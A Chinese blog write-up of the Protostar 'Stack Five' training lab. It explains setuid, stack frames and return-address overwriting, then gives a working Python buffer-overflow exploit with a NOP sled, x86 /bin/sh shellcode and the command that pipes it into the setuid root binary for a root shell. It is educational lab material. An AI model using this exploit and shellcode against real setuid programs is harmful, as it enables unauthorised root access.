![在这里插入图片描述](https://img-blog.csdnimg.cn/c8376253eb1f4665acd7cc10a2fbee40.png)
# 前言
这是一个系列文章，之前已经介绍过一些二进制安全的基础知识，这里就不过多重复提及，不熟悉的同学可以去看看我之前写的文章
```
二进制安全虚拟机Protostar靶场 安装,基础知识讲解,破解STACK ZERO
https://blog.csdn.net/qq_45894840/article/details/129490504?spm=1001.2014.3001.5501
```
```
二进制安全虚拟机Protostar靶场（2）基础知识讲解，栈溢出覆盖变量 Stack One,Stack Two
https://blog.csdn.net/qq_45894840/article/details/132688653?spm=1001.2014.3001.5501
```
```
二进制安全虚拟机Protostar靶场（3）溢出控制程序指针，基础知识讲解 Stack Three,Stack Four
https://blog.csdn.net/qq_45894840/article/details/132720953?spm=1001.2014.3001.5501
```
# Stack Five
## 程序静态分析
```
https://exploit.education/protostar/stack-five/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a12fefeb4e594ebf8f1a87cccd6ebe0e.png)
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
这个程序很简单，只有两行，作用只是接受我们的输入
## setuid
什么是setuid？
```
setuid代表设置用户身份，并且setuid设置调用进程的有效用户ID，用户运行程序的uid与调用进程的真实uid不匹配
```
这么说起来有点绕，我们来举一个例子
```
一个要以root权限运行的程序，但我们想让普通用户也能运行它，但又要防止该程序被攻击者利用，这里就需要用的setuid了
```
演示
我们用user用户运行一个vim
然后新开一个窗口查看后台进程
```
ps -aux
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/bbc3e82f1a2948209a4a1d37cdbc6ae5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
这里可以看到，我们的vim正在以user的权限运行中，然后我们去执行一下靶机上的setuid文件看看
![在这里插入图片描述](https://img-blog.csdnimg.cn/30c53f076fde40398592a2264a8f5a9f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
这里可以看到，我们虽然是user用户，但执行文件后，文件正以root权限运行
我们查看文件的权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/0f59f934076248e79dbcde8ff371e9e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16)
r代表读，w代表写，x代表执行，那s是什么呢
```
s替换了以x的可执行文件，这被称为setuid位，根据刚刚的操作，应该知道了s是做什么的
```
当这个位被user权限的用户执行时，linux实际上是以文件的创造者的权限运行的，在这种情况下，它是以root权限运行的
我们的目标就是，破解这些文件然后拿到root权限

## 什么是栈
可以把栈想象成一个堆积的书本，你可以把新的书本放在最顶部，也可以取出最顶部的书本。

当程序执行时，它会使用栈来跟踪函数调用和变量的值。每次你调用一个函数，计算机会在栈上创建一个新的“帧”（就像书本一样），用来存储这个函数的局部变量和执行时的一些信息。当函数执行完毕时，这个帧会被从栈上移除，就像取出一本书本一样。

栈通常是“后进先出”的，这意味着最后放入栈的数据会最先被取出。这是因为栈的操作是非常快速和高效的，所以它经常用于管理函数调用和跟踪程序执行流程

## 为什么要覆盖ret返回地址
覆盖 ret 返回地址是一种计算机攻击技巧，攻击者利用它来改变程序执行的路径。这个过程有点像将一个路标或导航指令替换成你自己的指令，以便程序执行到你想要的地方。

想象一下，你在开车时遇到一个交叉路口，路标告诉你向左拐才能到达目的地。但是，攻击者可能会悄悄地改变路标，让你误以为需要向右拐。当你按照这个伪装的路标行驶时，你最终会到达攻击者想要的地方，而不是你本来的目的地。

在计算机中，程序执行的路径通常是通过返回地址控制的，这个返回地址告诉计算机在函数执行完毕后应该继续执行哪里的代码。攻击者可以通过修改这个返回地址，迫使程序跳转到他们指定的地方，通常是一段恶意代码，而不是正常的程序代码

## 获取ret返回地址
使用gdb打开程序，在执行leave指令的地方下一个断点

![在这里插入图片描述](https://img-blog.csdnimg.cn/11d479c6260b4a3c89383958be65d347.png)





运行程序，随便输入一些字符，然后查看栈状态

```
x/100wx $esp
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/29dd75c07bfa4fbfba42dc8324af1723.png)

另外开一个远程连接界面，使用gdb打开程序，在执行ret指令的地方下一个断点

![在这里插入图片描述](https://img-blog.csdnimg.cn/8c83a2f252544df5a83a0ecb0af90474.png)

在第二个终端界面运行程序，随便输入一些字符，然后执行ret指令，查看程序跳转的地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/dce35252894c457dafe7ebdecccadb9c.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/0c491badbec348458a38504a3dfcd960.png)


根据计算，我们需要80个字符就能完全覆盖ret的返回地址，然后再将我们的shellcode放到控制数据的堆栈里

![在这里插入图片描述](https://img-blog.csdnimg.cn/e543522938ef4064998c87871b494942.png)

## nop指令

NOP指令是一种特殊的机器指令，它在计算机中执行时不做任何操作。简单来说，NOP指令是一种“空操作”，它不改变计算机的状态、不影响寄存器的值，也不执行任何计算或跳转

为了防止我们shellcode收到干扰，我们在shellcode代码前添加一些nop指令即可

## 脚本编写
```
import struct

padding = "A" * 76
eip = struct.pack("I",0xbffff7c0)
nopnop = "\x90"*64
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x88"

print padding+eip+nopnop+payload
```
首先设置一个76位的垃圾字符，然后利用struct模块的pack功能，作用是将一个无符号整数（I 表示无符号整数）转换为二进制数据，跳转到控制数据的栈里，最后写入nop指令和shellcode代码，shellcode代码可以在这个网站里找到
```
http://shell-storm.org/shellcode/files/shellcode-811.html
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e72e559cbcef42639fe2807ca851722b.png)

这是一个linux x86架构执行/bin/sh的shellcode

如果我们直接运行脚本是得不到/bin/sh的

![在这里插入图片描述](https://img-blog.csdnimg.cn/18b8e93ed85740ce94630c4c64a53877.png)

其实/bin/sh已经执行了，只是没有输入，我们可以用cat命令来重定向到标准输入输出

![在这里插入图片描述](https://img-blog.csdnimg.cn/f7df9bf7c886465f8c1b32a6dc4fa155.png)
```
 (python stack5exp.py ; cat) | /opt/protostar/bin/stack5
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/55370e694ef146e9be331d801e6ddad6.png)

成功破解程序
